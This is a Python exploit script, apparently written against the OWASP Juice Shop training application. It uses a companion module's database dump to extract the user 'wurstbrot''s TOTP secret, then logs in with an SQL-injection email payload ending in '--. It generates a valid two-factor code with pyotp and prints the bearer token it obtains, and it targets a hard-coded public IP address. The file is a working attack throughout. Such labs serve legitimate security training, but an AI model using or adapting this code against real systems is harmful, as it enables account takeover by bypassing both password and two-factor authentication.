import requests
from Attacks.Maxence.UserCredentials import UserCredentials
import pyotp

class TFA:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.text = ""
        self.headers = {"Content-Type": "application/json"}

    def log(self, string):
        print(string)
        self.text += string +"\n"

    def login_as_wurstbrot(self, password="whatever"):
        email, secret = self.handling_totpKey()
        if email == False:
            return False, self.text
        email = email + "'--"
        payload = {"email": email, "password": password}
        response = self.session.post(f"{self.base_url}/rest/user/login", json=payload, headers=self.headers)

        if response.status_code == 401 and "data" in response.json():
            tmptoken = response.json()["data"]["tmpToken"]
            self.log(f"[LOGIN] Waiting for Totp Token. Tmp Token: {tmptoken}\n")

            PIN = get_totp_code(secret=secret)
            self.log("Totp Token: " + PIN + "\n")

            endpoint = f"{self.base_url}/rest/2fa/verify"
            payload = {"tmpToken": tmptoken, "totpToken": PIN}
            response2 = self.session.post(endpoint, json=payload, headers=self.headers)
            
            if response2.status_code == 200 and "authentication" in response2.json():
                token = response2.json()["authentication"]["token"]
                self.headers["Authorization"] = f"Bearer {token}"
                self.log(f"[LOGIN] Successfully authenticated. Token: {token}\n")
                return True, self.text
        elif response.status_code == 200 and "authentication" in response.json():
                token = response.json()["authentication"]["token"]
                self.headers["Authorization"] = f"Bearer {token}"
                self.log(f"[LOGIN] Successfully authenticated. Token: {token}\n")
                return True, self.text
            
        self.log("[LOGIN] Failed to authenticate.")

        payload = {"email": email, "password": password}
        return False, self.text
    
    def handling_totpKey(self):
        db_text = UserCredentials.db_drop(self=UserCredentials(self.base_url))
        wurst_info = ""
        if "Fail with http code" in db_text:
            self.log("User Credentials error message: " + db_text)
            return False, ""
        for string in db_text.split(",{"):
            if "wurstbrot" in string: # Change here to search for another user with Two Factor Authentification
                wurst_info = string.split("}")[0]
        self.log("\nWurstbrot Infos: {" + wurst_info + "}\n")
        email = wurst_info.split('"name":"')[1].split('","description"')[0]
        totpkey = wurst_info.split('"price":"')[1].split('","deluxePrice"')[0]
        self.log("Email of wurstbrot: " + email)
        self.log("Totp Key: " + totpkey + "\n")
        return email, totpkey

def get_totp_code(secret):
    totp = pyotp.TOTP(secret)
    return totp.now()
    
def main():
    base_url = "http://45.76.47.218:3000"
    exploit = TFA(base_url)
    exploit.login_as_wurstbrot()


if __name__ == "__main__":
    main()